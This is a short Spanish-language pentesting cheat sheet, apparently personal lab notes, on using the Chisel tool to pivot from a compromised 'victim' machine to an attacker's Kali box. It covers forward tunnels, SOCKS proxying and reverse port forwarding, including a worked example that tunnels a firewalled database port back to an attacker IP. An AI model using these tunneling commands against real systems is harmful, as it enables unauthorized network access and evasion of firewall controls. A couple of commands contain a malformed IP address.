# Chisel for pivoting

- [Descargar Chisel](https://github.com/jpillora/chisel/releases)

### Chisel en maquina victima:
- `./chisel server --socks5 --port 51234`

### Chisel en maquina atacante kali
- `./chisel client victim-box-ip:51234 127.0.0.1:8001:127.0.0.1:8001 127.0.0.1:8443:127.0.01:8443`
    - Con esto vemos esos puertos en nuestro local
- Si no también así: `./chisel client attack-box-ip:51234 R:8001:127.0.0.1:8001 R:8443:127.0.01:8443`

## Chisel con socks

### Maquina victima
- `./chisel server --socks5 --port 51234`

### Maquina atacante kali
- `./chisel client target-box-ip:51234 50080:socks`

# Reverse port forwarding
- Ejecutar chisel server en maquina atacante en modo reverso

### Chisel en maquina atacante kali
- `./chisel server --reverse --port 51234`

### Chisel en maquina victima
- `./chisel client attack-box-ip:51234 R:50080:socks`

#### Se puede combinar con ligolo + revert port por si no hay acceso SSH


## Ejemplo de uso de chisel para escuchar un puerto que el firewall no permite
- Caso hipotetico de que comprometimos un servidor que posee una base de datos pero no podemos acceder a ella porque el firewall no permite conexiones desde la red de la base de datos a la red de la victima.
- Hacemos un reverse port forwarding con chisel y escuchamos el puerto de la base de datos en la maquina atacante.

### Maquina atacante:
- `./chisel server --port 445 --reverse`

### Maquina victima:
- `.\chisel.exe client 192.168.45.210:445 R:1433:127.0.0.1:1433`
    - `chisel client KALI_IP:PORT R:PORT:LOCALHOST:PORT`
        - Si justo estamos usando el puerto 1433 en nuestro kali para otra cosa podemos usar otro puerto
        - ``.\chisel.exe client 192.168.45.210:445 R:15432:127.0.0.1:1433`